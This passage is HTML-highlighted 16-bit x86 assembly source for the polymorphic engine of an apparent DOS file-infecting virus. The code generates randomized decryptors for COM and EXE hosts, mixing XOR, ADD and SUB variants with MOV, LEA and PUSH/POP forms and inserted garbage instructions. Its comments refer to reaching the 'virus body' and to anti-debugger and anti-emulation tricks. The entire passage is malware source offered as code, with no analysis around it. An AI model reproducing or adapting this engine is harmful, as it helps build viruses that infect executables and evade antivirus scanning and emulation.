        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@Salto</span><span class="sc0">       </span><span class="sc1">; If not, jump</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Aleatorio</span><span class="sc0">   </span><span class="sc1">; get a random word</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">      </span><span class="sc1">; Subtract it from the initial address</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SumaIndice</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0"> </span><span class="sc1">; Save it here</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">   </span><span class="sc5">@@Salto2</span><span class="sc0">      </span><span class="sc1">; Continue</span><span class="sc0">
   </span><span class="sc5">@@Salto</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SumaIndice</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">;Put 0 in the add-to-index</span><span class="sc0">
                             </span><span class="sc1">; field</span><span class="sc0">
   </span><span class="sc5">@@Salto2</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">PonInstrucMOV</span><span class="sc0">   </span><span class="sc1">; Put the setting-value instruction</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">         </span><span class="sc1">; Return</span><span class="sc0">
</span><span class="sc5">PonIndice</span><span class="sc0">   </span><span class="sc9">ENDP</span><span class="sc0">

</span><span class="sc1">;; Procedure to put the instruction that sets value to the key register for</span><span class="sc0">
</span><span class="sc1">;; decryption</span><span class="sc0">
</span><span class="sc5">PonEncriptador</span><span class="sc0">  </span><span class="sc9">PROC</span><span class="sc0">
        </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc8">BP</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0100h</span><span class="sc0">   </span><span class="sc1">; Do we decrypt using a key register?</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@Salto1</span><span class="sc0">      </span><span class="sc1">; If we don't, jump</span><span class="sc0">
   </span><span class="sc5">@@OtraVez</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Aleatorio</span><span class="sc0">   </span><span class="sc1">; Get a random word in AX</span><span class="sc0">
        </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">      </span><span class="sc1">; If the low byte is 0, repeat getting</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@OtraVez</span><span class="sc0">
        </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc0">      </span><span class="sc1">; If the high byte is 0, repeat</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@OtraVez</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">      </span><span class="sc1">; Put it in CX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">RegistroEncriptado</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Get key register in DL</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">WordEncriptado</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0"> </span><span class="sc1">; Save key here</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">PonInstrucMOV</span><span class="sc0">   </span><span class="sc1">; Put assignment in decryptor</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">         </span><span class="sc1">; return</span><span class="sc0">
     </span><span class="sc5">@@Salto1</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Aleatorio</span><span class="sc0">   </span><span class="sc1">; Get a random word in AX</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">PonStack</span><span class="sc0">    </span><span class="sc1">; Insert a stack instruction (if we're</span><span class="sc0">
                    </span><span class="sc1">; going to use RET, RETF or any of them</span><span class="sc0">
                    </span><span class="sc1">; to jump to virus body or next decryp-</span><span class="sc0">
                    </span><span class="sc1">; tor</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">WordEncriptado</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0"> </span><span class="sc1">; Save decrypt key</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">               </span><span class="sc1">; Return</span><span class="sc0">
</span><span class="sc5">PonEncriptador</span><span class="sc0">  </span><span class="sc9">ENDP</span><span class="sc0">

</span><span class="sc1">;;; Initial execution values in a COM and in an EXE. This is used to construct</span><span class="sc0">
</span><span class="sc1">;;; assignments with XOR, SUB, etc. and to put indexed memory writes without</span><span class="sc0">
</span><span class="sc1">;;; danger</span><span class="sc0">
</span><span class="sc1">;;; For COM:</span><span class="sc0">
</span><span class="sc5">InicValoresCOM</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; AX</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">00FFh</span><span class="sc0">       </span><span class="sc1">; CX</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; DX</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; BX</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0FFFEh</span><span class="sc0">      </span><span class="sc1">; SP</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">091Ch</span><span class="sc0">       </span><span class="sc1">; BP</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0100h</span><span class="sc0">       </span><span class="sc1">; SI</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0FFFEh</span><span class="sc0">      </span><span class="sc1">; DI</span><span class="sc0">
</span><span class="sc1">;;; For EXE:</span><span class="sc0">
</span><span class="sc5">InicValoresEXE</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; AX</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">00FFh</span><span class="sc0">       </span><span class="sc1">; CX</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; DX</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; BX</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; SP</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">091Ch</span><span class="sc0">       </span><span class="sc1">; BP</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">200h</span><span class="sc0">        </span><span class="sc1">; SI</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; DI</span><span class="sc0">

</span><span class="sc1">;; This stores an assignment instruction. The value to assign is passed in CX</span><span class="sc0">
</span><span class="sc1">;; and the register in DL. the procedure can construct MOVs (two different ty-</span><span class="sc0">
</span><span class="sc1">;; pes of opcode), LEA or PUSH Value/POP Reg. Moreover, in the first decryptor</span><span class="sc0">
</span><span class="sc1">;; the values can be set by XOR, ADD or SUB, too.</span><span class="sc0">
</span><span class="sc5">PonInstrucMOV</span><span class="sc0">   </span><span class="sc9">PROC</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">HazBasuraAleatoria</span><span class="sc0"> </span><span class="sc1">; Do garbage</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">PonStack</span><span class="sc0">       </span><span class="sc1">; Put stack instruction, if there's</span><span class="sc0">
                       </span><span class="sc1">; any to put</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">MiraSiPrimerDes</span><span class="sc0">    </span><span class="sc1">; First decryptor?</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">  </span><span class="sc5">Saslld</span><span class="sc0">         </span><span class="sc1">; If not, jump</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Aleatorio</span><span class="sc0">      </span><span class="sc1">; Get a Zero Flag with 1/4 of proba-</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03</span><span class="sc0">         </span><span class="sc1">; bility</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">  </span><span class="sc5">Saslld</span><span class="sc0">         </span><span class="sc1">; If Zero Flag, jump to do normal</span><span class="sc0">
                       </span><span class="sc1">; things :)</span><span class="sc0">
        </span><span class="sc6">MOVZX</span><span class="sc0">   </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc0">         </span><span class="sc1">; Put the register in BL</span><span class="sc0">
        </span><span class="sc6">ROL</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">          </span><span class="sc1">; Multiply by 2 and get the address</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">InicValoresCOM</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc0"> </span><span class="sc1">; where the value of the</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">TipoEjec</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; register initially (for</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@Otros</span><span class="sc0">          </span><span class="sc1">;  COM or EXE) is stored.</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0010h</span><span class="sc0">
     </span><span class="sc5">@@Otros</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02</span><span class="sc0">         </span><span class="sc1">; Check if register is DX (it will</span><span class="sc0">
                       </span><span class="sc1">; contain the PSP segment)</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">  </span><span class="sc5">Saslld</span><span class="sc0">         </span><span class="sc1">; If it is, it has no known value,</span><span class="sc0">
                       </span><span class="sc1">; so skip its use</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Get in BX the corresponding value</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02</span><span class="sc0">         </span><span class="sc1">; AL was between 1 and 3</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">    </span><span class="sc5">@@PonXOR</span><span class="sc0">         </span><span class="sc1">; If 1, do XOR</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@PonADD</span><span class="sc0">         </span><span class="sc1">; If 2, do ADD</span><span class="sc0">
                       </span><span class="sc1">; If 3, do SUB</span><span class="sc0">
     </span><span class="sc5">@@PonSUB</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">         </span><span class="sc1">; Subtract value to assign to initial</span><span class="sc0">
                       </span><span class="sc1">; value</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E881h</span><span class="sc0">     </span><span class="sc1">; Store "SUB"</span><span class="sc0">
       </span><span class="sc5">@@Sigue</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc0">         </span><span class="sc1">; Set register in opcode</span><span class="sc0">
        </span><span class="sc6">STOSW</span><span class="sc0">              </span><span class="sc1">; Store instruction</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">         </span><span class="sc1">; Store got value</span><span class="sc0">
        </span><span class="sc6">STOSW</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">            </span><span class="sc1">; Return</span><span class="sc0">
     </span><span class="sc5">@@PonXOR</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">         </span><span class="sc1">; Calculate assignment for XOR</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F081h</span><span class="sc0">     </span><span class="sc1">; Store "XOR"</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">   </span><span class="sc5">@@Sigue</span><span class="sc0">          </span><span class="sc1">; Jump</span><span class="sc0">
     </span><span class="sc5">@@PonADD</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">         </span><span class="sc1">; Calculate assignment for ADD</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C081h</span><span class="sc0">     </span><span class="sc1">; Store "ADD"</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">   </span><span class="sc5">@@Sigue</span><span class="sc0">          </span><span class="sc1">; Jump</span><span class="sc0">
</span><span class="sc1">;; Normal assignment (no weird anti-debugger/emulating assignments)</span><span class="sc0">
       </span><span class="sc5">Saslld</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Aleatorio</span><span class="sc0">      </span><span class="sc1">; Get a random AX</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03</span><span class="sc0">         </span><span class="sc1">; Get AL between 1 and 3</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">  </span><span class="sc5">Saslld</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">    </span><span class="sc5">@@PonLea</span><span class="sc0">         </span><span class="sc1">; If 1, construct a LEA</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@PonMOV</span><span class="sc0">         </span><span class="sc1">; If 2, construct a MOV</span><span class="sc0">
   </span><span class="sc1">; Construct a PUSH/POP</span><span class="sc0">
   </span><span class="sc5">@@PonPUSH</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">68h</span><span class="sc0">        </span><span class="sc1">; Store a direct value pushing opcode</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">         </span><span class="sc1">; Store value to assign</span><span class="sc0">
        </span><span class="sc6">STOSW</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">HazBasuraAleatoria</span><span class="sc0"> </span><span class="sc1">; Do garbage</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">SioNo</span><span class="sc0">          </span><span class="sc1">; Random Zero Flag</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@Saslld2</span><span class="sc0">        </span><span class="sc1">; If Zero Flag, use type I of PUSH opc.</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc0">         </span><span class="sc1">; Construct a two-byte POP opcode</span><span class="sc0">
        </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8Fh</span><span class="sc0">
        </span><span class="sc6">STOSW</span><span class="sc0">              </span><span class="sc1">; Insert it</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">            </span><span class="sc1">; return</span><span class="sc0">
     </span><span class="sc5">@@Saslld2</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc0">         </span><span class="sc1">; Construct a one-byte POP opcode</span><span class="sc0">
        </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">58h</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">              </span><span class="sc1">; Store it</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">            </span><span class="sc1">; Return</span><span class="sc0">
   </span><span class="sc1">; Construct a MOV</span><span class="sc0">
   </span><span class="sc5">@@PonMOV</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">SioNo</span><span class="sc0">          </span><span class="sc1">; Random Zero Flag</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@PonMOV2</span><span class="sc0">        </span><span class="sc1">; If Zero Flag, do another type of MOV</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc0">         </span><span class="sc1">; Put register in AL</span><span class="sc0">
        </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0B8h</span><span class="sc0">       </span><span class="sc1">; Convert it to MOV</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">              </span><span class="sc1">; Store it</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">   </span><span class="sc5">@@Salto</span><span class="sc0">          </span><span class="sc1">; Jump</span><span class="sc0">
   </span><span class="sc5">@@PonMOV2</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C7h</span><span class="sc0">       </span><span class="sc1">; MOV opcode</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc0">       </span><span class="sc1">; Set register on</span><span class="sc0">
        </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc0">         </span><span class="sc1">; Put register on data opcode</span><span class="sc0">
        </span><span class="sc6">STOSW</span><span class="sc0">              </span><span class="sc1">; Store it</span><span class="sc0">
   </span><span class="sc5">@@Salto</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">         </span><span class="sc1">; Store word for assignment</span><span class="sc0">
        </span><span class="sc6">STOSW</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">            </span><span class="sc1">; return</span><span class="sc0">
   </span><span class="sc1">; construct a LEA</span><span class="sc0">
   </span><span class="sc5">@@PonLEA</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">ROL</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">          </span><span class="sc1">; Adapt register to bit fields in opcode</span><span class="sc0">
        </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">DL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">          </span><span class="sc1">; Set "direct memory address" on</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8Dh</span><span class="sc0">        </span><span class="sc1">; LEA opcode</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc0">         </span><span class="sc1">; Put converted DL like data opcode</span><span class="sc0">
        </span><span class="sc6">STOSW</span><span class="sc0">              </span><span class="sc1">; Store it</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">   </span><span class="sc5">@@Salto</span><span class="sc0">          </span><span class="sc1">; Store assignment value</span><span class="sc0">
</span><span class="sc5">PonInstrucMOV</span><span class="sc0">   </span><span class="sc9">ENDP</span><span class="sc0">

</span><span class="sc1">;; A very used procedure to generate a random Zero Flag</span><span class="sc0">
</span><span class="sc5">SioNo</span><span class="sc0">       </span><span class="sc9">PROC</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">       </span><span class="sc1">; Save AX</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Aleatorio</span><span class="sc0">    </span><span class="sc1">; Get a random word in AX</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01</span><span class="sc0">       </span><span class="sc1">; Check if even (Zero Flag) or odd (Non-</span><span class="sc0">
                     </span><span class="sc1">; Zero Flag)</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">       </span><span class="sc1">; Restore AX</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">          </span><span class="sc1">; return with flag set on or off</span><span class="sc0">
</span><span class="sc5">SioNo</span><span class="sc0">       </span><span class="sc9">ENDP</span><span class="sc0">

</span><span class="sc1">;; Routine to construct the decrypt instruction</span><span class="sc0">
</span><span class="sc5">HazEncriptador</span><span class="sc0">  </span><span class="sc9">PROC</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">BP</span><span class="sc0">       </span><span class="sc1">; Get in AL the decryption operation</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">18h</span><span class="sc0">
        </span><span class="sc6">ROR</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">OpcodesCriptado</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">200h</span><span class="sc0">
        </span><span class="sc6">XLAT</span><span class="sc0">             </span><span class="sc1">; Then, AL must be 31h, 01h or 29h (XOR,</span><span class="sc0">
                     </span><span class="sc1">; ADD or SUB)</span><span class="sc0">
        </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc8">BP</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0100h</span><span class="sc0">    </span><span class="sc1">; Check if the key is in a register</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@NoEncripREG</span><span class="sc0">  </span><span class="sc1">; If not, jump</span><span class="sc0">

</span><span class="sc1">;; Construct a decrypt instruction that uses a register to decrypt, for exam-</span><span class="sc0">
</span><span class="sc1">;; ple  XOR [BX+75D4],AX</span><span class="sc0">
</span><span class="sc5">@@EncripREG</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">RegistroEncriptado</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Get key register in DL</span><span class="sc0">
        </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc8">BP</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0080h</span><span class="sc0">   </span><span class="sc1">;Check if decrypt must be done byte-to-byte</span><span class="sc0">
                    </span><span class="sc1">; or word-to-word</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@Salto001</span><span class="sc0">    </span><span class="sc1">; If word-to-word, jump</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">04</span><span class="sc0">      </span><span class="sc1">; Is the key register a ?X type register?</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">    </span><span class="sc5">@@Salto002</span><span class="sc0">    </span><span class="sc1">; If it is, continue</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">BP</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FEFFh</span><span class="sc0">  </span><span class="sc1">; If not, set "decrypt by register" off and</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">   </span><span class="sc5">@@NoEncripREG</span><span class="sc0"> </span><span class="sc1">; decrypt by direct value</span><span class="sc0">
    </span><span class="sc5">@@Salto002</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">      </span><span class="sc1">; Decrement opcode to get byte decryption</span><span class="sc0">
        </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc8">BP</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0200h</span><span class="sc0">   </span><span class="sc1">; Are we going to use the high byte or the</span><span class="sc0">
                    </span><span class="sc1">; low byte of the register?</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@Salto001</span><span class="sc0">    </span><span class="sc1">; If we're going to use the low byte, jump</span><span class="sc0">
        </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">DL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">04h</span><span class="sc0">     </span><span class="sc1">; Convert register to ?H</span><span class="sc0">
    </span><span class="sc5">@@Salto001</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">STOSB</span><span class="sc0">           </span><span class="sc1">; Store opcode</span><span class="sc0">
        </span><span class="sc6">ROL</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">       </span><span class="sc1">; Adapt register to bit field on opcode</span><span class="sc0">
